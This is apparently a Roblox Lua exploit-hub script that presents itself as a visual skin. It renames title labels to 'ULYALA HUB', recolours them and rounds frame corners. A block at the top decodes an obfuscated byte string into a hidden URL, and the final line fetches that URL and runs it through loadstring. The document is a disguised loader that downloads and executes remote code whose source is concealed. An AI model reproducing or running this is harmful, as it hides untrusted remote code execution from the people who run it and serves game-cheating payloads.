
--[[ STAGE 2: VISUAL CORE ]]
local LGYEitxVGOdnspp2EKU="\085\068\071\070\076\118\142\113\055\073\034\124\056\061\043\034\018\034\024\025\046\030\018\001\003\012\000\012\245\050\010\249\250\063\225\229\231\253\236\231\210\233\217\193\213\003\217\204\198\195\206\189\202\184\187\225\162\185\164\172\208\187\168\150\153\152\148\153\132\155\166\151\174\135\147\103\097\121\105\109\101\111\087\101\124\091\068\068\088\093\090\119\119\117\123\096\102\101\054\100\037\017\032"local opJIRzUE1LiuxzO8Fjt=240 local rcQHzC3t1vMjctC5Wz8=36 local PIBCWvNaqd89UDL=1 local kb25U9k3ebix2cA=3 local LwQBSwrt9nB40K=22 local AxhPx27qA19b5RMqslcAl=false local RrxiYbUoHGOE=bit32 and bit32.bxor if not RrxiYbUoHGOE then RrxiYbUoHGOE=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local csbXZFRfHYxxjJr={}for imvAbBGTUnyQ=1,#LGYEitxVGOdnspp2EKU do local o4lEetzExOzJTHi=string.byte(LGYEitxVGOdnspp2EKU,imvAbBGTUnyQ)local Xd2cyUxx9niLHeI=(rcQHzC3t1vMjctC5Wz8+(imvAbBGTUnyQ*kb25U9k3ebix2cA)+LwQBSwrt9nB40K)%256 if PIBCWvNaqd89UDL==0 then o4lEetzExOzJTHi=(o4lEetzExOzJTHi-Xd2cyUxx9niLHeI)%256 csbXZFRfHYxxjJr[imvAbBGTUnyQ]=string.char(RrxiYbUoHGOE(o4lEetzExOzJTHi,opJIRzUE1LiuxzO8Fjt))else o4lEetzExOzJTHi=RrxiYbUoHGOE(o4lEetzExOzJTHi,opJIRzUE1LiuxzO8Fjt)csbXZFRfHYxxjJr[imvAbBGTUnyQ]=string.char((o4lEetzExOzJTHi-Xd2cyUxx9niLHeI)%256)end end local H2fl9pax0GuWc6Qq=table.concat(csbXZFRfHYxxjJr)if AxhPx27qA19b5RMqslcAl then H2fl9pax0GuWc6Qq=string.reverse(H2fl9pax0GuWc6Qq)end local r5AfDuZrvt83aIgmWkGF=H2fl9pax0GuWc6Qq
local HubName = "ULYALA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(r5AfDuZrvt83aIgmWkGF))()
